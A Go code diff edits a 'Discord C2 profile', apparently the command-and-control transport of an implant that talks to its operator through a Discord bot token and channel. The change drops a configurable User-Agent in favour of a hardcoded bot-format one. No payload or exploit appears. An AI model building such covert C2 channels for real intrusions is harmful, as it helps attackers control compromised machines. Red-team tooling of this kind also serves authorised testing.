@@ -30,8 +30,9 @@ const (
 	maxMessageLength  = 1950 // Discord limit ~2000; server uses 1950 threshold
 	defaultPollChecks = 10   // Default number of polling attempts per message exchange
 	defaultPollDelay  = 10   // Default seconds between polling attempts
-	// Discord blocks browser-like User-Agents (e.g. "Mozilla/5.0") when used with
-	// Bot token auth, returning 403/40333. Use a bot-style UA for API calls.
+	// Discord's API requires a bot-format User-Agent for Bot token auth. Browser-like
+	// UAs (e.g. "Mozilla/5.0") return 403/40333. This is hardcoded because Discord
+	// enforces the format — operator customization would break API access.
 	discordBotUA = "DiscordBot (https://github.com, 1.0)"
 )
 
@@ -86,8 +87,7 @@ type DiscordProfile struct {
 	Debug         bool
 	MaxRetries    int // message_checks: max polling attempts per exchange
 	PollInterval  int // time_between_checks: seconds between polls
-	UserAgent     string
-	ProxyURL      string
+	ProxyURL string
 
 	client   *http.Client
 	vault    *configVault
@@ -111,7 +111,7 @@ type DiscordProfile struct {
 }
 
 // NewDiscordProfile creates a new Discord C2 profile.
-func NewDiscordProfile(botToken, channelID, encryptionKey string, sleepInterval, jitter, maxRetries, pollInterval int, debug bool, userAgent, proxyURL string) *DiscordProfile {
+func NewDiscordProfile(botToken, channelID, encryptionKey string, sleepInterval, jitter, maxRetries, pollInterval int, debug bool, proxyURL string) *DiscordProfile {
 	if maxRetries <= 0 {
 		maxRetries = defaultPollChecks
 	}
@@ -139,8 +139,7 @@ func NewDiscordProfile(botToken, channelID, encryptionKey string, sleepInterval,
 		Debug:         debug,
 		MaxRetries:    maxRetries,
 		PollInterval:  pollInterval,
-		UserAgent:     userAgent,
-		ProxyURL:      proxyURL,
+		ProxyURL: proxyURL,
 		client: &http.Client{
 			Timeout:   30 * time.Second,
 			Transport: transport,
